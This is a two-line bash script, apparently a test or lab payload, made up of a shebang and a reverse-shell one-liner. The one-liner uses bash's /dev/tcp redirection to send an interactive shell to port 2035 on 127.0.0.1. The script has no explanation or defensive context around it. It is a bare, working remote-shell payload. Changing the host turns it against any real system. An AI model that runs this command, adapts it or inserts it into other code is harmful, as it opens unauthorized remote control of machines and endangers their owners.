#!/bin/bash

bash -i >& /dev/tcp/127.0.0.1/2035 0>&1
